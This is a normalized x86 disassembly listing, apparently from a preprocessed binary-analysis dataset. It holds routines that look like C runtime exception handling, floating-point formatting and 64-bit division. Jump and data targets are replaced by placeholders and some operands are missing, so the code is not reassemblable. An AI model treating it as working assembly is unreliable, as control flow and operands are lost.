mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_4217bf
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_4217bf
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_405b42
push ebx
push esi
call sub_4217bf
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_4217bf
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_4217bf
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_4217bf
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_4217bf
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_4217bf
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_4026b0
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_4217bf
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_420822
pop ecx
pop ecx
push eax
push esi
call sub_4026b0
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_4057b5
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_420822
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_420c24
push 0x8
push r--data
call sub_405770
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_420822
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_41f708
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_420aa5
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4057b5
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_420822
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_41f708
jmp r-xdata
sub_420cb5
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_420c24
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_41f6d8
call sub_41f70f
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_4206a8
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_420909
add esp 0x28
test eax eax
je r-xdata
sub_420d21
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_405021
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_405021
lea edi [ eax + 0x80 ]
call sub_404dfc
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_41f939
mov edi eax
mov eax [ ebp - 0x4 ]
add esp 0x14
cmp eax [ ebp - 0x8 ]
jae r-xdata
call sub_405b42
cmp [ esi ] 0xe0434f4d
je r-xdata
pop edi
push ebx
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_41f7c7
add esp 0x1c
test eax eax
jne r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x14
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp esi [ edi + 0x4 ]
jg r-xdata
cmp esi [ edi ]
jl r-xdata
pop ebx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
lea ebx [ eax - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_420cb5
mov esi [ ebp + 0x1c ]
add esp 0x1c
sub_420e13
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
cmp eax 0x80
push esi
push edi
mov [ ebp - 0x1 ] 0x0
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_405b42
cmp ecx eax
jl r-xdata
cmp ecx 0xffffffff
mov [ ebp - 0x8 ] ecx
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_405021
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_405b42
jmp sub_405af6
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_420d21
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_405021
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_405021
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_405021
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_4217bf
test eax eax
pop ecx
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_41f939
add esp 0x14
mov edi eax
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_405b42
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_4207ce
pop ecx
pop ecx
mov edi [ ebp + 0x18 ]
mov eax [ ebp - 0x8 ]
cmp [ edi ] eax
jg r-xdata
call sub_405021
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
add edi 0x14
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
call sub_405021
mov edi [ eax + 0x94 ]
call sub_405021
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_420847
test al al
pop ecx
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov eax [ edi + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
test eax eax
mov [ ebp - 0x18 ] eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_420847
test al al
pop ecx
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x14 ] eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_402edf
test al al
jne r-xdata
call sub_405b42
cmp eax 0x19930522
jne r-xdata
call sub_405021
call sub_405021
call sub_405021
mov [ eax + 0x88 ] esi
call sub_405021
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
call sub_420608
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_4207ce
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp + 0x8 ] r--data
call sub_402f2f
push r--data
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x2c ] r--data
call sub_406cc4
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov ebx [ ebp - 0xc ]
push [ ebp + 0x20 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_420cb5
mov esi [ ebp + 0x8 ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_41f70f
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_4206a8
add esp 0x10
push [ esi + 0x1c ]
call sub_4208c0
sub_421181
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_405021
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_420e13
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_4206a8
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_421270
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_409fbc
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_409fbc
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_4212c0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_4212ed
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_403014
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_422250
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_4217cc
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_409038
leave
retn
sub_421393
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_403014
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_422250
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_421d0e
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_409038
leave
retn
sub_421439
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
push edi
mov edi [ ecx + 0xc ]
jne r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
call sub_406b99
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
cmp edx ebx
mov [ esi ] bl
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov eax edx
jmp r-xdata
cmp edx ebx
mov [ esi ] 0x30
lea eax [ esi + 0x1 ]
jle r-xdata
call sub_406b99
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
cmp edx ebx
mov [ eax ] bl
jl r-xdata
mov cl [ edi ]
cmp cl bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_406efa
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc edi
jmp r-xdata
lea edi [ esi + 0x1 ]
push edi
call sub_405d10
inc eax
push eax
push edi
push esi
call sub_4026b0
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
cmp edx ebx
jg r-xdata
xor eax eax
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_4214f6
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x6 ]
push ebx
mov ecx eax
push esi
push edi
shr ecx 0x4
and eax 0x8000
mov edi 0x7ff
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
test ebx ebx
mov [ ebp - 0x4 ] esi
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
add ecx 0x3c01
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ecx 0x3c00
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
add edx edx
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
test esi edx
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
test esi ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
jne r-xdata
movzx edi cx
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_4215b1
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x30 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4214f6
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_422910
mov esi [ ebp - 0x30 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ ebx ] eax
movsx eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_405b8a
add esp 0x24
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_409038
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_406dfe
add esp 0x14
sub_421640
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_42171f
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
test ecx 0xfcf0fce0
push esi
je r-xdata
mov esi [ ebp + 0x8 ]
test esi esi
push eax
push [ ebp + 0xc ]
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
je r-xdata
call sub_423304
call sub_423304
mov [ esi ] eax
jmp r-xdata
call sub_406b99
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_406efa
add esp 0x14
mov eax edi
pop edi
jmp r-xdata
push esi
push esi
call sub_423304
pop ecx
pop ecx
mov [ edi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_421789
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_4217cc
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
cmp ebx 0xffffc001
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
